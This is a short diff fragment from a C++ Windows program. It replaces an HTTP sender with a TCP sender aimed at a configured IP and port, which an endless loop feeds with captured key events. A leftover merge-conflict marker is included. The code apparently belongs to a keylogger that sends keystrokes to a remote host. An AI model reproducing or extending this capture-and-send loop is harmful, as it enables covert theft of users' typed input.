@@ -33,10 +33,10 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     cout << "ip = " << ip << ", port = " << port << endl;
 
 
-    HttpSender* httpSender = new HttpSender(ip, port);
+    TcpSender* tcpSender = new TcpSender(ip, port);
 
     while(true){
-        key.WriteEventKeys(httpSender);
+        key.WriteEventKeys(tcpSender);
     }
 >>>>>>> Stashed changes
 
